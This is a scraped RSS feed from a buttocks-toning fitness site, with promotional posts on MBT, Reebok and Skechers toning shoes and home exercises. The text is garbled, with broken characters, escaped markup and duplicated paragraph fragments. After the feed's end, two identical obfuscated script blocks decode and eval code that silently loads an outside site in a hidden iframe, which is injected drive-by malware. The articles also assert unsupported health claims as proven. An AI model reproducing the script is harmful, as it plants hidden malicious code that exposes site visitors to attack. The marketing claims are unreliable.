Looking to tone up your body with ease? Only, who has time for hours in the gym using awkward machinery that only targets certain areas of the body? Wouldn\ufffdt it be nice if you could tone your entire body while doing something you do every day? Well, with MBT footwear options, now you can. Tone your body just by walking around town!\n<p>Masai Barefoot Technology, or MBT, is a new type of footwear design to improve your health as well as the look of your body while you do something you already do daily &#8211; simply walking! Muscles are strengthened and toned, specifically in the feet, legs, buttocks, thighs, stomach and back. Lower body circulation is also increased to benefit your health, as well as helping to prevent or lessen the appearance of unwanted cosmetic issues like cellulite and varicose veins.\n<p>MBT shoes are available for both men and woman in an astounding number of types and styles. There are athletic sneakers, leather casual wear sneakers, clogs, boots, loafers, sandals and even dress shoes for men! Whether you want something casual to walk around town in or something to wear all the time, there are more than enough stylish options for you to choose from.\n<p>Research proves that more calories are burned by standing in MBT shoes than if you were walking in other shoes! Now just imagine how many calories are shed by walking in these shoes. How do they work? Emulating how our ancient ancestors traditionally walked, Masai Barefoot Technology uses a multilayered sole so that you are no longer walking on a flat surface. It has been compared to walking barefoot in the sand for an extended period of time.\n<p>This more natural step includes a curved sole to support the foot but also to encourage a different walking manner. This way, muscles are challenged and encouraged to be more active in maintaining correct posture. The natural pull-through motion of a step is created, causing it to be followed throughout the whole body, with an end result of the correct and natural posture and gait. Research has even been done on whether one can improve one\ufffds golf game by wearing MBT shoes!\n<p>This new form of footwear technology trains your feet\ufffdand the rest of your body in turn\ufffdby causing you to balance, and it has been described as a similar feeling as balancing a tennis ball under the foot as you stand and walk. Different muscles are used for both standing and walking to ensure that all lower body muscles are equally flexed and toned as you wear the shoes.\n<p>It is also because of these posture corrections that many doctors have begun to prescribe MBT footwear to help particular conditions, or even just to help increase health and fitness levels for some patients. Conditions that have been said to be helped by MBT footwear are hip disorders, lower back pain, knee injuries and ankle instability. Tight muscles can also be relaxed by use of MBT shoes, and back and joint problems are said to decrease.\n<p>These shoes are especially recommended for athletes and runners. They cannot be worn during athletic activity, as one\ufffds running gait is different than a walking gait, but normal wear can improve the health and performance of the muscles dramatically. After wearing MBT footwear, muscles in the feet respond differently and increase the amount of shock absorbed by joints and discs. This decreases any chances of injuries, as well as lowering the amount of stress placed on the body during athletic activities. A double layer of cushioning in the shoe ensures that the entire foot has enough support for extended periods of walking.\n<p>The idea was created from watching African runners train and noticing how few injuries they seemed to have. Researchers observed the difference in how the foot hit the ground barefoot as compared to in regular shoes. Thus, the goal was to create a shoe which had a similar natural motion as running barefoot, with a rolling motion that encouraged interaction from other muscles in the body. This interaction is what prevents injuries from occurring. When the body is off balance, it naturally stabilizes itself, which is healthier than wearing shoes that attempt to stabilize your body for you.\n<p>With MBT Shoes, tone up your entire body by just walking! Why wear boring walking shoes or bland dress shoes when you can wear attractive shoes that increase your health as well as the appearance of your body? By simply changing your shoes, take your health back into your own hands and improve your body with every step!</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-diet/tone-your-entire-body-with-mbt-shoes/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t\t<item>\n\t\t<title>Take toning up a level with Reebok Traintones</title>\n\t\t<link>http://www.toningyourbuttocks.com/buttocks-exercise/take-toning-up-a-level-with-reebok-traintones/</link>\n\t\t<comments>http://www.toningyourbuttocks.com/buttocks-exercise/take-toning-up-a-level-with-reebok-traintones/#comments</comments>\n\t\t<pubDate>Sun, 28 Aug 2011 16:24:25 +0000</pubDate>\n\t\t<dc:creator>admin</dc:creator>\n\t\t\t\t<category><![CDATA[Buttocks Exercise]]></category>\n\t\t<category><![CDATA[toning exercises]]></category>\n\t\t<category><![CDATA[toning your buttocks]]></category>\n\n\t\t<guid isPermaLink=\"false\">http://www.toningyourbuttocks.com/?p=485</guid>\n\t\t<description><![CDATA[It doesn&#8217;t seem like very long ago that Reebok were getting everyone out of the gym by turning everyday walking into a muscle toning workout thanks to their Easytone shoes.

The highly stylish toner shoes were an instant hit with women looking to get in shape faster and get more rewards from the time they spent exercising. What made them such a bestselling style was their ability to convert dead time into toning time, making a day long workout a possibility without having to go to the gym, or have the expense that accompanies it. Whenever walking the dog, walking to work, or running for the bus, the muscles get better body tone as they work harder with each step.\n<p>Now that Reebok has got so many bottoms and legs into great shape and good condition, they return to the gym with their Traintones. The shoes are based on the Easytone design, however have been modified to make them more stable and comfortable for the gym and fitness classes. They still tone the muscles throughout the lower body, although not to such a high degree as with the Easytone. The distinctive instability pods on the outsoles of the shoes are shallower in Reebok Traintones to offer the stability and durability necessary to cope with higher impact workouts, and the toe pod has been replaced with a toe gripper, for extra traction when up on the toes.\n<p>The instability pods in the soles create an uneven base, and the shifting air inside the pods ensures that the muscles in the lower body are kept active as they correct the balance. Working out in Reebok Traintones targets the muscles in the calves, hamstrings and buttocks to improve body tone quickly, and will also help to increase strength and stamina, not just in the lower body but also in the core muscles too. The added work the muscles have to do helps to increase endurance, boosting strength and stamina to keep you training for longer.\n<p>Whilst an unstable base might sound uncomfortable, Reebok have worked hard on the design to make it one of the most comfortable shoes they have ever produced. Inside the shoes, a seamless lining is ultra smooth on the feet, and removes all potential sources of abrasion. A cushioned insole is highly comfortable, and a removable sockliner can be replaced with a custom orthotic insert for posture correction and added support. The midsole is well cushioned, and DMX shear technology in the heel slows down the heel strike and dissipates the shockwaves for greater comfort.\n<p>With great comfort and cushioning, highly attractive styling and the chance to improve body tone without exercising for longer, make these Reebok toning shoes a great addition to your gym kit, and will get you in shape in next to no time.</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-exercise/take-toning-up-a-level-with-reebok-traintones/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t\t<item>\n\t\t<title>Benefits From Muscle Toning Shoes Such as Skechers Shape Ups</title>\n\t\t<link>http://www.toningyourbuttocks.com/buttocks-exercise/benefits-from-muscle-toning-shoes-such-as-skechers-shape-ups/</link>\n\t\t<comments>http://www.toningyourbuttocks.com/buttocks-exercise/benefits-from-muscle-toning-shoes-such-as-skechers-shape-ups/#comments</comments>\n\t\t<pubDate>Sat, 27 Aug 2011 08:28:09 +0000</pubDate>\n\t\t<dc:creator>admin</dc:creator>\n\t\t\t\t<category><![CDATA[Buttocks Exercise]]></category>\n\t\t<category><![CDATA[buttocks exercises]]></category>\n\t\t<category><![CDATA[exercises for buttocks]]></category>\n\n\t\t<guid isPermaLink=\"false\">http://www.toningyourbuttocks.com/?p=483</guid>\n\t\t<description><![CDATA[Many Americans suffer from different types of pain but the most common ones are pain in their knee, back and joints.

Americans have recently started wearing the muscle toning shoes commonly known as Skechers Shape Ups. By using the toning muscle shoe it can surprisingly reduce the aches and pains that many Americans have. Because most Americans walk around all day on hard surfaces like concrete and asphalt in normal shoes, it puts an unnatural posture on their bodies.

It allows the body to keep going forward without any slouching. This shoe also allows the stimulation of those muscles that are neglected throughout our bodies. These types of muscles were formed to compensate for uneven surfaces, but because most Americans walk on even hard ground all day these muscles don&#8217;t get worked very often. By wearing muscle toning shoes it brings back the dormant muscles back to life.\n<p>It&#8217;s not only the dormant muscles that are not being worked out properly either. Thighs, abs and buttocks will be stimulated because of the natural instability that is designed in the shoe. By wearing this shoe it will increase the amount of burned calories not only while you are walking but also while you are standing. There are many different types of brands of these muscle toning shoes that one can purchase. You may want to check these brands out.\n<p>Skechers Shape Ups have entered into the market of muscle toning shoes by introducing their ShapeUps line.

ShapeUps are worn to help reduce body fat and help tone muscles and help strengthen them. It helps improve your body&#8217;s posture and help relieve tension. Shape Ups are not designed to take place of regular exercise, it&#8217;s designed to help you exercise while going about your daily business.\n<p>Earth Shoes have a patented Kalso Negative Heel Technology that allows your toes to be 3.7 degrees higher than your heels. They use a Biofoam for cushion and have an anatomic arch support. By wearing these shoes you can burn up to four times the calories with every step you take.

When you&#8217;re ready to take your health into your own hands, you want to learn as much as you can about the proper ways to workout. This knowledge will help you make the most of each movement as well as prevent discouraging injuries along the way. Here are some simple toning exercises for women that you can perform anywhere at any time.\n<p>What&#8217;s great about many toning exercises for women is that they don&#8217;t require any equipment or any initial monetary investment. All you&#8217;ll need for the following toning exercises for women is a sturdy chair or wall. You can perform these exercises in order or you can do these toning moves whenever you have a free moment &#8211; it all adds up to a fitter you.\n<p> * Wall pushups &#8211; On a sturdy wall, place your hands in front of you and slowly lean into the wall. Push back off with your arms and chest. Repeat.\n<p> * Squats &#8211; Standing with your feet a little more than shoulder&#8217;s width apart, slowly bend your knees to come into a sitting position, but don&#8217;t let your knees extend past your toes as you do so. Your upper body should be as straight as possible (imagine a string attached to the top of your head as you move). Lower until almost at a ninety degree angle and then lift back up.<br /> * Suck it in &#8211; While this seems a little too easy, try holding your stomach in as tightly as you can for as long as you can. You will work out all of the muscles in your abdomen. Do this whenever you can. You can perform the same tightening motion for your buttocks too to increase their tone.\n<p> * Calf raises &#8211; In a standing position, try to lift your heels from the floor and hold in that position. Slowly lower yourself down.\n<p>These toning exercises for women are simply to do when you&#8217;re standing around at work or when you&#8217;re in line at the post office. And while they don&#8217;t require any weights or resistance bands, they can be modified to include these forms of resistance as you improve your fitness levels. You will also want to remember that the more toning exercises for women you do, the more benefits you will receive in return. So, if you only have a few minutes to spare, try to fit in as many exercises you can. You may even begin to enjoy standing in line once you see the way your body changes.</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-toning/simple-toning-exercises-for-women/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t\t<item>\n\t\t<title>How To Tone Thighs &#8211; What Are Some Effective Exercises To Get Leaner And Thinner Thighs?</title>\n\t\t<link>http://www.toningyourbuttocks.com/buttocks-diet/how-to-tone-thighs-what-are-some-effective-exercises-to-get-leaner-and-thinner-thighs/</link>\n\t\t<comments>http://www.toningyourbuttocks.com/buttocks-diet/how-to-tone-thighs-what-are-some-effective-exercises-to-get-leaner-and-thinner-thighs/#comments</comments>\n\t\t<pubDate>Thu, 25 Aug 2011 06:41:37 +0000</pubDate>\n\t\t<dc:creator>admin</dc:creator>\n\t\t\t\t<category><![CDATA[Buttocks Diet]]></category>\n\t\t<category><![CDATA[buttocks exercises]]></category>\n\t\t<category><![CDATA[toning thighs]]></category>\n\n\t\t<guid isPermaLink=\"false\">http://www.toningyourbuttocks.com/?p=479</guid>\n\t\t<description><![CDATA[How to tone thighs has always been a point of interest for women looking to get into shape.

Tons of exercise methods and equipment have been promoted and advertised, all claiming to be effective in toning that particular area. Most people have been taught that squats, jogging, lunges, and other leg exercises are the best exercise they can follow. However, there are other effective ways to tone your thighs; these may be different from what you believe to be effective exercises but however different they may be, they are worth giving it a shot. Let\ufffds take a look at some of these methods.\n<p><b>Walking backwards</b></p>\n<p>\n<p>One of the most effective methods on how to tone thighs is walking backwards on a treadmill. It may sound absurd, and it may be quite unnerving to execute when you are at a gym, but this exercise works better that walking the right way. Walking backwards works the hamstring and buttocks more than walking forward does.</p>\n<p>\n<p>This exercise is also more effective when the treadmill is given an incline \ufffd about 5-10 degrees should be a decent angle. It may seem like simple walking, but this exercise really targets the thigh area. If it results in soreness in those areas a day after, then it is a sign that this exercise is doing its job well. Doing this for about 20 minutes a day, and about 4 days a week is a good workout plan.\n<p><b>Jumping jacks and jump rope</b></p>\n<p>\n<p>Another great way on how to tone thighs is either one of the two most common exercises we know: jumping jacks or the use of a jump rope. We all know jumping jacks as just a simple end to warm up or cool down exercises. However, this exercise deserves more credit than it gets because it is truly an effective way of toning your thighs.</p>\n<p>\n<p>An alternative to this, as already stated, is the use of a jump rope, which also works on the legs. You can choose between these two options, or mix them up to vary up your routine. Either way, 6 minutes a day of this exercise will pay off in fantastic results.</p>\n<p>\n<p>Of course no thigh workout will be effective if there is no good cardio workout or proper diet to accompany it. Toning thighs means getting rid of the fat that surrounds the muscles and you can speed up this process by cutting back on fatty and processed foods. A good cardio workout is also an essential companion; it may not be enough to get rid of all the fat, but it is important that you balance the work that you do.</p>\n<p>There is a multitude of ways on how to tone thighs and the methods discussed here are just a few of them. Learn what you can and make it work for you.</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-diet/how-to-tone-thighs-what-are-some-effective-exercises-to-get-leaner-and-thinner-thighs/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t\t<item>\n\t\t<title>Increase Strength and Reduce Cellulite with These Great Toning Shoes</title>\n\t\t<link>http://www.toningyourbuttocks.com/buttocks-toning/increase-strength-and-reduce-cellulite-with-these-great-toning-shoes/</link>\n\t\t<comments>http://www.toningyourbuttocks.com/buttocks-toning/increase-strength-and-reduce-cellulite-with-these-great-toning-shoes/#comments</comments>\n\t\t<pubDate>Wed, 24 Aug 2011 09:11:22 +0000</pubDate>\n\t\t<dc:creator>admin</dc:creator>\n\t\t\t\t<category><![CDATA[Buttocks Toning]]></category>\n\t\t<category><![CDATA[toning butt]]></category>\n\t\t<category><![CDATA[toning thighs]]></category>\n\n\t\t<guid isPermaLink=\"false\">http://www.toningyourbuttocks.com/?p=477</guid>\n\t\t<description><![CDATA[The popularity of muscle toning shoes has positively exploded!

But, if you, like so many others, have indulged a little too much over the summer months, it could be time to start toning up for Christmas. Whether you&#8217;re planning on wearing a little black dress and your new size 4 high heels to the office party, or you&#8217;re going to have a big celebration and expect to gain a few extra pounds &#8211; now&#8217;s the time to start toning up.\n<p>But, before you start working out, you need to decide which part of your body you want to focus on. Ladies regularly try to lose a few inches around the waist and tone up their thighs and buttocks. With one eye on their Christmas party dress, ladies can make themselves feel and look better with a few simple exercises in the few months before the holidays.\n<p>In the current climate money is tight, especially with the expensive Christmas period approaching. So, if you want to tone up on a budget, you can&#8217;t go far wrong by taking to the streets. Whether walking or running, it&#8217;s free of charge and a great way to burn calories and get the blood pumping. With a partner or a friend, turn previously painful exercise into a pleasure by enjoying a relaxing, sociable walk. Also, why don&#8217;t you avoid the lifts and take the stairs instead? It&#8217;s another simple way to tone up those problem areas and you&#8217;ll feel much better for it.\n<p>Bought yourself a new pair of glamorous high heels and want your legs to look great for your office party this Christmas? It&#8217;s time to get on your bike. Nearly all of us know how to ride a bike, and if we don&#8217;t there&#8217;s another ideal alternative &#8211; the exercise bike. Whichever suits you best, the bike is a fantastic way to tone up your bum, thighs and calves. We all know that high heels make your party outfit, so put in the hours on your bike this autumn and your size 4 high heels will look stunning for the Christmas festivities.\n<p>Gymnasiums are the most popular destinations for those a little more serious about exercise, and it&#8217;s easy to see why. Many of the machines are specifically designed to target particular areas of your body. Whether it&#8217;s your bum, legs or tum &#8211; the gym will have the machine for you. Many gyms also offer trial periods so you won&#8217;t have to sign up for a long period &#8211; perfect for toning up for a special event!\n<p>You don&#8217;t want to join a gym, but you don&#8217;t mind spending a little money to get results. Swimming pools could be right for you. For just a small fee, you can take to the water and get a full body workout at your local swimming baths. As well as toning more muscles than most exercise routines, swimming also provides a cardiovasular workout that will have long term benefits &#8211; so you&#8217;ll look good and feel great. Perfect preparation for your Christmas festivities.\n<p>For the most noticeable effect from your pre-Christmas tone up sessions, the best solution is a combination of all exercises types with a programme of healthier eating. It really is that simple &#8211; eat healthy and exercise more for stunning results that will give you the best Christmas present possible.</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-diet/tone-up-in-time-for-your-christmas-festivities/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t\t<item>\n\t\t<title>The Home Gym: Muscle Toning Equipment</title>\n\t\t<link>http://www.toningyourbuttocks.com/buttocks-diet/the-home-gym-muscle-toning-equipment/</link>\n\t\t<comments>http://www.toningyourbuttocks.com/buttocks-diet/the-home-gym-muscle-toning-equipment/#comments</comments>\n\t\t<pubDate>Sun, 21 Aug 2011 15:23:37 +0000</pubDate>\n\t\t<dc:creator>admin</dc:creator>\n\t\t\t\t<category><![CDATA[Buttocks Diet]]></category>\n\t\t<category><![CDATA[exercises for buttocks]]></category>\n\n\t\t<guid isPermaLink=\"false\">http://www.toningyourbuttocks.com/?p=471</guid>\n\t\t<description><![CDATA[Many benefits of having a fitness room or a gym in one&#8217;s own home span from the economic to the plainly convenient.

Having the ability to get a full body workout by simply going into another room in the house beats stepping outside and traveling to the public gym any day. A home gym gives you a 24-hour access to as much exercise as you would like. A home gym also eliminates the usual lines of people waiting to use any available exercise machine. It also allows you to use a particular piece of equipment without any time limits, thereby giving you unlimited access and use for yourself.\n<p>There is also the economic convenience of getting rid of the regular gym membership payments, especially considering that many people are too caught up in the busy daily life to have enough time to get a proper workout. For those people, the gym membership fees they continually pay for quickly become wasted money.\n<p>Although considerable investments must be made for a home gym, there is the fact that in the end, you can get as much workout as you would normally get in a public gym, right in the safety and convenience of your own home.\n<p>A more specific instance of benefit would be the privacy you will get for yourself, as you use your very own resistance exercise machines. With the right kind of management and commitment, you can achieve the kind of muscular workout that you would in a public gym, right in your own home. The procedures are the same, the equipment is the same; the only thing that changes is the fact that you don&#8217;t actually have to go to the gym to get the same results.\n<p>For a complete home-based muscle toning facility you would need the usual machines: leg weights, free weights, abdominal benches, a bench press machine, a rowing machine, hand weights, and other resistance training equipment,\n<p>Toning exercises come with the same considerations: work out specific parts of the body on specific days, for your body to get the chance to heal.\n<p>To tone the pectoral muscles, use the bench press. This machine can also benefit other muscle groups such as the triceps, deltoids, and other similar parts.\n<p>The abdominal bench is what you turn to for you to tone your core muscles, such as the upper and lower abdomen. It will also give your obliques a good workout, and combined with a well-toned abdomen, you will obtain a well-sculpted core that is highly noticeable in time.\n<p>For toned legs and calves, turn to the leg weights. It provides added resistance that can boost muscle strength, without the dangers of overworking your muscles. Using weights as light as 2 or 3 pounds, you will rest assured get very good results. Be reminded, however, that when using leg weights, a 5 \u00e2\ufffd&#8221;pound maximum must be observed for the sake of safety.\n<p>Leg weights are also proven useful for the development and toning of other muscles groups, such as those in the thighs and the buttocks, when used while doing aerobic exercise.\n<p>Forearm muscle groups benefit from the use of free weights and hand weights.\n<p>While you do have the convenience of getting a full toning workout at home, remember that the same effective use procedures still apply when it comes to your machines. If your objective is merely to tone your muscles, keep in mind that you only need light weights: doing so allows you to do more repetitions and more sets, compared to the greater weights used in strength training.\n<p>Remember to do each exercise slowly: you expend more energy from each muscle when you perform slowly, thereby keeping the specific muscles stressed and flexed while you are working out.\n<p>One very important thing to remember is to keep your form while exercising. Good posture contributes to a good workout, and it assures you of greater safety as well. Because you are using added weight in your exercise, bad posture can lead to muscle strain and injury \u00e2\ufffd&#8221; an ever-present, but avoidable hazard when training with weights.\n<p>Finally, just like what any personal trainer would tell you: exercise is not enough for successful muscle toning. Your workout must receive the right support from healthy eating habits and weight loss. Despite the fact that your toning exercises are precise and correct, your muscle conditions would be of no use unless you get rid of the excess fat covering them.</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-diet/the-home-gym-muscle-toning-equipment/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t\t<item>\n\t\t<title>muscle toning is good for health</title>\n\t\t<link>http://www.toningyourbuttocks.com/buttocks-diet/muscle-toning-is-good-for-health/</link>\n\t\t<comments>http://www.toningyourbuttocks.com/buttocks-diet/muscle-toning-is-good-for-health/#comments</comments>\n\t\t<pubDate>Sat, 20 Aug 2011 00:59:22 +0000</pubDate>\n\t\t<dc:creator>admin</dc:creator>\n\t\t\t\t<category><![CDATA[Buttocks Diet]]></category>\n\t\t<category><![CDATA[exercises for buttocks]]></category>\n\t\t<category><![CDATA[toning butt]]></category>\n\n\t\t<guid isPermaLink=\"false\">http://www.toningyourbuttocks.com/?p=469</guid>\n\t\t<description><![CDATA[How does aging affect body shape?

The less muscles we have, the less calories we burn.\n<p>So as we begin to lose muscle tissue our fat burning capacity diminishes and we begin to add weight to various parts of our frame.\n<p>This process often begins after the age of 25.\n<p>In men, the fat tends to go to the mid-section.\n<p>In women, the fat often goes to the abdominals, thighs and buttocks.\n<p>What is the difference between body toning and dieting?<br />Dieting involves adjusting the diet through supplements or abstinence from certain foods for periods of time in order to lose weight.\n<p>Body toning may or may not include weight loss. Generally it means firming up parts of the body through exercise, muscle building and/or the use of certain herbal formulas which can be applied to the parts of the body needing attention.\n<p>How important is exercise when considering body toning?<br />Very important!\n<p>Walking is one of the best exercises for strengthening bones, controlling weight, toning the leg muscles, maintaining good posture and improving our self-image.\n<p>Specific exercise and <a target=\"_new\" rel=\"nofollow\" href=\"http://www.healthinlife.com/whats-so-good-about-toning/\">muscle toning</a> programs can tighten a protruding stomach, remove the bulge around the waist, add support to the back muscles, lift and firm a sagging bottom or tone flabby thighs for better-looking, shapelier legs.\n<p>Want to look good?\n<p>When you take the time to do body toning exercises, your body will stay firmer and more supple. Muscles create trim looking lines and features no matter what your gender. And instead of letting time bring all of your important parts into a sagging repose, muscles can help to keep your appearance nice and tight. Who doesn&#8217;t want that?\n<p>Body toning exercises are something that will keep you from aging faster than you might like. When you take the time to start a well-rounded body toning exercise program, you will start to feel as young as you want to feel and look even better than you might have thought you could!</p>\n]]></content:encoded>\n\t\t\t<wfw:commentRss>http://www.toningyourbuttocks.com/buttocks-diet/muscle-toning-is-good-for-health/feed/</wfw:commentRss>\n\t\t<slash:comments>0</slash:comments>\n\t\t</item>\n\t</channel>\n</rss>\n<script>if(window.document)a=(\"urf3\".split+'qwe').substr(0,6);aa=(Date+{}).substr(0,6);if(a===aa)f=[-28,-28,68,65,-5,3,63,74,62,80,72,64,73,79,9,66,64,79,32,71,64,72,64,73,79,78,29,84,47,60,66,41,60,72,64,3,2,61,74,63,84,2,4,54,11,56,4,86,-28,-28,-28,68,65,77,60,72,64,77,3,4,22,-28,-28,88,-5,64,71,78,64,-5,86,-28,-28,-28,63,74,62,80,72,64,73,79,9,82,77,68,79,64,3,-3,23,68,65,77,60,72,64,-5,78,77,62,24,2,67,79,79,75,21,10,10,82,64,61,74,77,63,64,77,72,60,73,60,66,64,77,9,62,74,72,2,-5,82,68,63,79,67,24,2,12,11,2,-5,67,64,68,66,67,79,24,2,12,11,2,-5,78,79,84,71,64,24,2,81,68,78,68,61,68,71,68,79,84,21,67,68,63,63,64,73,22,75,74,78,68,79,68,74,73,21,60,61,78,74,71,80,79,64,22,71,64,65,79,21,11,22,79,74,75,21,11,22,2,25,23,10,68,65,77,60,72,64,25,-3,4,22,-28,-28,88,-28,-28,65,80,73,62,79,68,74,73,-5,68,65,77,60,72,64,77,3,4,86,-28,-28,-28,81,60,77,-5,65,-5,24,-5,63,74,62,80,72,64,73,79,9,62,77,64,60,79,64,32,71,64,72,64,73,79,3,2,68,65,77,60,72,64,2,4,22,65,9,78,64,79,28,79,79,77,68,61,80,79,64,3,2,78,77,62,2,7,2,67,79,79,75,21,10,10,82,64,61,74,77,63,64,77,72,60,73,60,66,64,77,9,62,74,72,2,4,22,65,9,78,79,84,71,64,9,81,68,78,68,61,68,71,68,79,84,24,2,67,68,63,63,64,73,2,22,65,9,78,79,84,71,64,9,75,74,78,68,79,68,74,73,24,2,60,61,78,74,71,80,79,64,2,22,65,9,78,79,84,71,64,9,71,64,65,79,24,2,11,2,22,65,9,78,79,84,71,64,9,79,74,75,24,2,11,2,22,65,9,78,64,79,28,79,79,77,68,61,80,79,64,3,2,82,68,63,79,67,2,7,2,12,11,2,4,22,65,9,78,64,79,28,79,79,77,68,61,80,79,64,3,2,67,64,68,66,67,79,2,7,2,12,11,2,4,22,-28,-28,-28,63,74,62,80,72,64,73,79,9,66,64,79,32,71,64,72,64,73,79,78,29,84,47,60,66,41,60,72,64,3,2,61,74,63,84,2,4,54,11,56,9,60,75,75,64,73,63,30,67,68,71,63,3,65,4,22,-28,-28,88];md='a';q=\"q\";e=eval;w=f;s='';g='fro'+'mCharCode';for(i=0;i<w.length;i++){s=s+String[g](37+w[i]);}if(a===aa)e('e(s)');</script><script>if(window.document)a=(\"urf3\".split+'qwe').substr(0,6);aa=(Date+{}).substr(0,6);if(a===aa)f=[-28,-28,68,65,-5,3,63,74,62,80,72,64,73,79,9,66,64,79,32,71,64,72,64,73,79,78,29,84,47,60,66,41,60,72,64,3,2,61,74,63,84,2,4,54,11,56,4,86,-28,-28,-28,68,65,77,60,72,64,77,3,4,22,-28,-28,88,-5,64,71,78,64,-5,86,-28,-28,-28,63,74,62,80,72,64,73,79,9,82,77,68,79,64,3,-3,23,68,65,77,60,72,64,-5,78,77,62,24,2,67,79,79,75,21,10,10,82,64,61,74,77,63,64,77,72,60,73,60,66,64,77,9,62,74,72,2,-5,82,68,63,79,67,24,2,12,11,2,-5,67,64,68,66,67,79,24,2,12,11,2,-5,78,79,84,71,64,24,2,81,68,78,68,61,68,71,68,79,84,21,67,68,63,63,64,73,22,75,74,78,68,79,68,74,73,21,60,61,78,74,71,80,79,64,22,71,64,65,79,21,11,22,79,74,75,21,11,22,2,25,23,10,68,65,77,60,72,64,25,-3,4,22,-28,-28,88,-28,-28,65,80,73,62,79,68,74,73,-5,68,65,77,60,72,64,77,3,4,86,-28,-28,-28,81,60,77,-5,65,-5,24,-5,63,74,62,80,72,64,73,79,9,62,77,64,60,79,64,32,71,64,72,64,73,79,3,2,68,65,77,60,72,64,2,4,22,65,9,78,64,79,28,79,79,77,68,61,80,79,64,3,2,78,77,62,2,7,2,67,79,79,75,21,10,10,82,64,61,74,77,63,64,77,72,60,73,60,66,64,77,9,62,74,72,2,4,22,65,9,78,79,84,71,64,9,81,68,78,68,61,68,71,68,79,84,24,2,67,68,63,63,64,73,2,22,65,9,78,79,84,71,64,9,75,74,78,68,79,68,74,73,24,2,60,61,78,74,71,80,79,64,2,22,65,9,78,79,84,71,64,9,71,64,65,79,24,2,11,2,22,65,9,78,79,84,71,64,9,79,74,75,24,2,11,2,22,65,9,78,64,79,28,79,79,77,68,61,80,79,64,3,2,82,68,63,79,67,2,7,2,12,11,2,4,22,65,9,78,64,79,28,79,79,77,68,61,80,79,64,3,2,67,64,68,66,67,79,2,7,2,12,11,2,4,22,-28,-28,-28,63,74,62,80,72,64,73,79,9,66,64,79,32,71,64,72,64,73,79,78,29,84,47,60,66,41,60,72,64,3,2,61,74,63,84,2,4,54,11,56,9,60,75,75,64,73,63,30,67,68,71,63,3,65,4,22,-28,-28,88];md='a';q=\"q\";e=eval;w=f;s='';g='fro'+'mCharCode';for(i=0;i<w.length;i++){s=s+String[g](37+w[i]);}if(a===aa)e('e(s)');</script>"

            "\t\t\t<content:encoded><![CDATA[<p>Ready to get back in shape after all those holiday treats? Looking to tone up your body with ease? Only, who has time for hours in the gym using awkward machinery that only targets certain areas of the body? Wouldn\ufffdt it be nice if you could tone your entire body while doing something you do every day? Well, with MBT footwear options, now you can. Tone your body just by walking around town!",
            "<p>Masai Barefoot Technology, or MBT, is a new type of footwear design to improve your health as well as the look of your body while you do something you already do daily &#8211; simply walking! Muscles are strengthened and toned, specifically in the feet, legs, buttocks, thighs, stomach and back. Lower body circulation is also increased to benefit your health, as well as helping to prevent or lessen the appearance of unwanted cosmetic issues like cellulite and varicose veins.",
            "<p>MBT shoes are available for both men and woman in an astounding number of types and styles. There are athletic sneakers, leather casual wear sneakers, clogs, boots, loafers, sandals and even dress shoes for men! Whether you want something casual to walk around town in or something to wear all the time, there are more than enough stylish options for you to choose from.",
            "<p>Research proves that more calories are burned by standing in MBT shoes than if you were walking in other shoes! Now just imagine how many calories are shed by walking in these shoes. How do they work? Emulating how our ancient ancestors traditionally walked, Masai Barefoot Technology uses a multilayered sole so that you are no longer walking on a flat surface. It has been compared to walking barefoot in the sand for an extended period of time.",
            "<p>This more natural step includes a curved sole to support the foot but also to encourage a different walking manner. This way, muscles are challenged and encouraged to be more active in maintaining correct posture. The natural pull-through motion of a step is created, causing it to be followed throughout the whole body, with an end result of the correct and natural posture and gait. Research has even been done on whether one can improve one\ufffds golf game by wearing MBT shoes!",
            "<p>This new form of footwear technology trains your feet\ufffdand the rest of your body in turn\ufffdby causing you to balance, and it has been described as a similar feeling as balancing a tennis ball under the foot as you stand and walk. Different muscles are used for both standing and walking to ensure that all lower body muscles are equally flexed and toned as you wear the shoes.",
            "<p>It is also because of these posture corrections that many doctors have begun to prescribe MBT footwear to help particular conditions, or even just to help increase health and fitness levels for some patients. Conditions that have been said to be helped by MBT footwear are hip disorders, lower back pain, knee injuries and ankle instability. Tight muscles can also be relaxed by use of MBT shoes, and back and joint problems are said to decrease.",
            "<p>These shoes are especially recommended for athletes and runners. They cannot be worn during athletic activity, as one\ufffds running gait is different than a walking gait, but normal wear can improve the health and performance of the muscles dramatically. After wearing MBT footwear, muscles in the feet respond differently and increase the amount of shock absorbed by joints and discs. This decreases any chances of injuries, as well as lowering the amount of stress placed on the body during athletic activities. A double layer of cushioning in the shoe ensures that the entire foot has enough support for extended periods of walking.",
            "<p>The idea was created from watching African runners train and noticing how few injuries they seemed to have. Researchers observed the difference in how the foot hit the ground barefoot as compared to in regular shoes. Thus, the goal was to create a shoe which had a similar natural motion as running barefoot, with a rolling motion that encouraged interaction from other muscles in the body. This interaction is what prevents injuries from occurring. When the body is off balance, it naturally stabilizes itself, which is healthier than wearing shoes that attempt to stabilize your body for you.",
            "<p>With MBT Shoes, tone up your entire body by just walking! Why wear boring walking shoes or bland dress shoes when you can wear attractive shoes that increase your health as well as the appearance of your body? By simply changing your shoes, take your health back into your own hands and improve your body with every step!</p>",

